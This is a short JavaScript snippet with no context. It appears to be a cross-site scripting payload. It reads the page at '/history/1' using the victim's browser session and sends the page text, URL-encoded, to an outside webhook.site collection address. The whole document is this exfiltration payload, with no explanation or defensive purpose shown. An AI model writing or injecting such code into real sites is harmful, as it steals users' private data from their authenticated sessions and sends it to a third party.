fetch('/history/1')
  .then(r => r.text())
  .then(t => fetch('https://webhook.site/ee7e160b-3a01-4a1e-8452-45d8221902e1?data=' + encodeURIComponent(t)));
